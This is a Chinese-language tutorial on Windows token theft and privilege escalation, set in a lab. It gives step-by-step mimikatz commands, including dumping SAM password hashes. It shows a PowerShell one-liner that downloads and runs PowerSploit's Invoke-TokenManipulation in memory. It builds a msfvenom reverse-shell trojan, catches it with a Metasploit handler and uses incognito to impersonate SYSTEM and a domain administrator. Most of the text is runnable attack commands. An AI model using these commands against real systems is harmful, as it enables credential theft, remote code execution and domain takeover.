# 令牌窃取

Windows有两种类型的Token：

·Delegation token\(授权令牌\):用于交互会话登录\(例如本地用户直接登录、远程桌面登录\)

·Impersonation token\(模拟令牌\):用于非交互登录\(利用net use访问共享文件夹\)

注：

两种token只在系统重启后清除

具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效

#### 使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token <a id="-mimikatz-token-token-system-token-token"></a>

进入mimikatz文件夹，右键mimikatz.exe，选择以管理员身份运行

![](https://p408.ssl.qhimgs4.com/t01904f612c4553f313.png)

使用privilege::debug获取debug权限

![](https://p408.ssl.qhimgs4.com/t019c32ca2abe92e57f.png)

使用token::elevate模仿system用户的令牌

![](https://p408.ssl.qhimgs4.com/t015b5ba6e4d07a3638.png)

使用token::list列出令牌

![](https://p408.ssl.qhimgs4.com/t0124379b879dd76e6e.png)

使用 lsadump::sam来获取sam数据库中的密码

![](https://p408.ssl.qhimgs4.com/t0147703bffdfaddb38.png)

使用token::revert恢复令牌

![](https://p408.ssl.qhimgs4.com/t018197da4fa7e7c38b.png)

#### 使用powershell下载执行令牌窃取工具Invoke-TokenManipulation.ps1 <a id="-powershell-invoke-tokenmanipulation-ps1"></a>

Invoke-TokenManipulation下载地址为：[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1)

打开一个powershell

![](https://p408.ssl.qhimgs4.com/t010dbf18cb00c6f5b8.png)

了解invoke-expression的功能： 运行一个以字符串形式提供的Windows PowerShell表达式，可以简化为iex

了解downloadstring的用法: \(new-object net.webclient\).downloadstring\(‘脚本的下载地址’\) 下载的内容保存在内存当中，数据类型为字符串，可以使用iex当做powershell命令执行

![](https://p408.ssl.qhimgs4.com/t01ec32a25d43c63ada.png)

最后是执行脚本中的cmdlet：

```text
Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1’);
Invoke-TokenManipulation
```

合并为一条语句

```text
Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1’);Invoke-TokenManipulation
```

![](https://p408.ssl.qhimgs4.com/t01178d71f4b432c1d0.png)

使用get-help Invoke-TokenManipulation 来查看帮助 get-help Invoke-TokenManipulation –examples来查看例子

![](https://p408.ssl.qhimgs4.com/t0109414cecf0b3607e.png)

枚举令牌： Invoke-TokenManipulation –enumerate

![](https://p408.ssl.qhimgs4.com/t01de05efd8ea0dd1c4.png)

模仿system账户的令牌，之后恢复令牌（-revtoself）

```text
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\system"
Invoke-TokenManipulation -RevToSelf
```

![](https://p408.ssl.qhimgs4.com/t01be5475d24f48e583.png)

#### 在meterpreter中使用incognito模块窃取令牌 <a id="-meterpreter-incognito-"></a>

获取meterpreter的过程如下： 在shell中输入： ifconfig

![](https://p408.ssl.qhimgs4.com/t0186b52f1c1d81f6d2.png)

可以看到红线的地方就是本主机的ip地址，需要将meterpreter反弹到此ip地址上，例如：

```text
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.59 LPORT=4444 -f exe -o exp1.exe
```

这样会在当前目录下生成一个exp1.exe文件

![](https://p408.ssl.qhimgs4.com/t01770f917a2d03ea0e.png)

将这个文件拷贝到windows 2012实验主机上 此主机上继续执行msfconsole，打开metasploit

![](https://p408.ssl.qhimgs4.com/t0158c224690475dae1.png)

输入use exploit/multi/handler

![](https://p408.ssl.qhimgs4.com/t0120dfefb19d78ecd7.png)

输入下列命令： set payload windows/meterpreter/reverse\_tcp set lhost 本机ip地址（上面使用ifconfig查看的ip地址） set lport 4444 run

![](https://p408.ssl.qhimgs4.com/t018e5145332575d640.png)

在windows主机上执行msf生成的木马 正常情况如下图，有一个meterpreter反弹回来

![](https://p408.ssl.qhimgs4.com/t01f0a9ba0f3050e2fa.png)

在meterpretr界面中输入load incognito来加载模块

![](https://p408.ssl.qhimgs4.com/t018edbaf3372ea1689.png)

输入help指令可以查看相关命令

![](https://p408.ssl.qhimgs4.com/t0174ccb1818396f500.png)

分别使用list\_tokens –u与list\_tokens -g

使用impersonate\_token来窃取令牌，注意反斜线的转义

```text
impersonate_token "NT AUTHORITY\\SYSTEM"
```

![](https://p408.ssl.qhimgs4.com/t01d8dabbccf121ccda.png)

最后使用rev2self来恢复令牌

#### 应用举例 <a id="-"></a>

以本地管理员账户登录，查看Token

```text
incognito.exe list_tokens -u
```

![](https://p408.ssl.qhimgs4.com/t011ee70e1b4a77ed2a.png)

发现域管账户SCHOOL\Administrator

尝试列出域控目录：

![](https://p408.ssl.qhimgs4.com/t01eb5f7d0935632286.png)

以域管的Token启动一个CMD

```text
incognito.exe execute -c "SCHOOL\Administrator" cmd.exe
```

![](https://p408.ssl.qhimgs4.com/t015e012c6b70a7b593.png)

再次列出域控目录：

![](https://p408.ssl.qhimgs4.com/t013160eba44b562ee0.png)

